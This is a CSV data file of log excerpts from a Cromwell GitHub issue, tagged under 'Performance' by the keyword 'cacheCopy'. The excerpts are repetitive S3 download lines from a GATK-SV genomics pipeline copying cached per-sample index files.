Performance,"41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-75/cacheCopy/SR00c.HG03099.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-75/cacheCopy/SR00c.HG03099.txt.gz.tbi; 1608597072537,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-4/cacheCopy/SR00c.HG00150.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-4/cacheCopy/SR00c.HG00150.txt.gz.tbi; 1608597074143,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-42/cacheCopy/SR00c.HG01885.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-42/cacheCopy/SR00c.HG01885.txt.gz.tbi; 1608597076382,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/E",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:36528,cache,cacheCopy,36528,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-10/cacheCopy/SR00c.HG00349.txt.gz.tbi; 1608597054920,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-51/cacheCopy/SR00c.HG02186.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-51/cacheCopy/SR00c.HG02186.txt.gz.tbi; 1608597057531,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-5/cacheCopy/SR00c.HG00187.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-5/cacheCopy/SR00c.HG00187.txt.gz; 1608597060059,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-8/cacheCopy/SR00c.HG00288.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:32503,cache,cacheCopy,32503,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-106/cacheCopy/SR00c.NA12340.txt.gz; 1608597524955,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-153/cacheCopy/SR00c.NA20895.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-153/cacheCopy/SR00c.NA20895.txt.gz.tbi; 1608597527253,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-43/cacheCopy/SR00c.HG01958.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-43/cacheCopy/SR00c.HG01958.txt.gz; 1608597529228,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-112/cacheCopy/SR00c.NA18539.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf0",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:163014,cache,cacheCopy,163014,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-108/cacheCopy/SR00c.NA12872.txt.gz; 1608597003743,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-129/cacheCopy/SR00c.NA19351.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-129/cacheCopy/SR00c.NA19351.txt.gz.tbi; 1608597005866,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-130/cacheCopy/SR00c.NA19377.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-130/cacheCopy/SR00c.NA19377.txt.gz.tbi; 1608597008325,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-119/cacheCopy/SR00c.NA18945.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:18779,cache,cacheCopy,18779,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-110/cacheCopy/SR00c.NA18507.txt.gz; 1608597328928,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-136/cacheCopy/SR00c.NA19684.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-136/cacheCopy/SR00c.NA19684.txt.gz.tbi; 1608597331137,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-121/cacheCopy/SR00c.NA18995.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-121/cacheCopy/SR00c.NA18995.txt.gz; 1608597333778,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-117/cacheCopy/SR00c.NA18923.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:106662,cache,cacheCopy,106662,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-111/cacheCopy/SR00c.NA18530.txt.gz; 1608597642095,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-137/cacheCopy/SR00c.NA19746.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-137/cacheCopy/SR00c.NA19746.txt.gz.tbi; 1608597643768,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-91/cacheCopy/SR00c.HG03727.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-91/cacheCopy/SR00c.HG03727.txt.gz.tbi; 1608597646131,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-MergeSRFilesByContig/shard-5/write_lines_1aa3abac483dac7d55fbf1572054f418.tmp to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMe",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:194803,cache,cacheCopy,194803,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-116/cacheCopy/SR00c.NA18638.txt.gz.tbi; 1608597157882,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-5/cacheCopy/SR00c.HG00187.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-5/cacheCopy/SR00c.HG00187.txt.gz.tbi; 1608597159853,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-97/cacheCopy/SR00c.HG03872.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-97/cacheCopy/SR00c.HG03872.txt.gz.tbi; 1608597162870,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-150/cacheCopy/SR00c.NA20802.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:60545,cache,cacheCopy,60545,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-123/cacheCopy/SR00c.NA19035.txt.gz; 1608597369233,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-101/cacheCopy/SR00c.HG04161.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-101/cacheCopy/SR00c.HG04161.txt.gz.tbi; 1608597371711,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-48/cacheCopy/SR00c.HG02020.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-48/cacheCopy/SR00c.HG02020.txt.gz; 1608597374474,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-83/cacheCopy/SR00c.HG03476.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:117260,cache,cacheCopy,117260,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-125/cacheCopy/SR00c.NA19102.txt.gz; 1608597413700,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-143/cacheCopy/SR00c.NA20321.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-143/cacheCopy/SR00c.NA20321.txt.gz.tbi; 1608597415362,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-12/cacheCopy/SR00c.HG00410.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-12/cacheCopy/SR00c.HG00410.txt.gz.tbi; 1608597418094,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-104/cacheCopy/SR00c.NA10847.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:129744,cache,cacheCopy,129744,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-127/cacheCopy/SR00c.NA19184.txt.gz; 1608597051239,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-151/cacheCopy/SR00c.NA20845.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-151/cacheCopy/SR00c.NA20845.txt.gz.tbi; 1608597053171,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-10/cacheCopy/SR00c.HG00349.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-10/cacheCopy/SR00c.HG00349.txt.gz.tbi; 1608597054920,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-51/cacheCopy/SR00c.HG02186.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergin",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:31250,cache,cacheCopy,31250,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-140/cacheCopy/SR00c.NA19913.txt.gz; 1608597112463,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-110/cacheCopy/SR00c.NA18507.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-110/cacheCopy/SR00c.NA18507.txt.gz.tbi; 1608597115454,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-66/cacheCopy/SR00c.HG02620.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-66/cacheCopy/SR00c.HG02620.txt.gz; 1608597116706,download: 